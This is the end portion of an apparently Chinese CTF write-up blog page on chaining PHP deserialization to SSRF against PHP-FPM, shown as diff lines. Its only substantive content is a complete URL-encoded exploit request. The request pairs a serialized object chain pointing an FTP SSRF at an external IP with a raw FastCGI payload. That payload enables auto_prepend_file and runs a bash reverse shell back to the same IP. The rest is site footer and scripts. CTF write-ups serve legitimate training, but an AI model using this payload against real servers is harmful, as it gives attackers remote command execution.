+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=O%3A6%3A%22Bypass%22%3A2%3A%7Bs%3A3%3A%22aaa%22%3BO%3A4%3A%22Esle%22%3A0%3A%7B%7Ds%3A4%3A%22str4%22%3BO%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A8%3A%22username%22%3BO%3A5%3A%22Bunny%22%3A1%3A%7Bs%3A8%3A%22filename%22%3Bs%3A31%3A%22ftp%3A%2F%2Faaa%4081.70.59.112%3A7008%2F123%22%3B%7D%7D%7D&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH104%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00h%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/81.70.59.112/7777%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf"><span class="toc-number">1.</span> <span class="toc-text">陇原战役-php反序列化到ssrf</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://yenannn.github.io/2022/03/25/%E9%99%87%E5%8E%9F-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://yenannn.github.io/2022/03/25/%E9%99%87%E5%8E%9F-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/&text=陇原-php反序列化到ssrf打fpm"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://yenannn.github.io/2022/03/25/%E9%99%87%E5%8E%9F-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/&title=陇原-php反序列化到ssrf打fpm"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://yenannn.github.io/2022/03/25/%E9%99%87%E5%8E%9F-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/&is_video=false&description=陇原-php反序列化到ssrf打fpm"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=陇原-php反序列化到ssrf打fpm&body=Check out this article: https://yenannn.github.io/2022/03/25/%E9%99%87%E5%8E%9F-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://yenannn.github.io/2022/03/25/%E9%99%87%E5%8E%9F-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/&title=陇原-php反序列化到ssrf打fpm"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://yenannn.github.io/2022/03/25/%E9%99%87%E5%8E%9F-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/&title=陇原-php反序列化到ssrf打fpm"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://yenannn.github.io/2022/03/25/%E9%99%87%E5%8E%9F-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/&title=陇原-php反序列化到ssrf打fpm"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://yenannn.github.io/2022/03/25/%E9%99%87%E5%8E%9F-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/&title=陇原-php反序列化到ssrf打fpm"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://yenannn.github.io/2022/03/25/%E9%99%87%E5%8E%9F-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/&name=陇原-php反序列化到ssrf打fpm&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://yenannn.github.io/2022/03/25/%E9%99%87%E5%8E%9F-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/&t=陇原-php反序列化到ssrf打fpm"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    Yenan
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
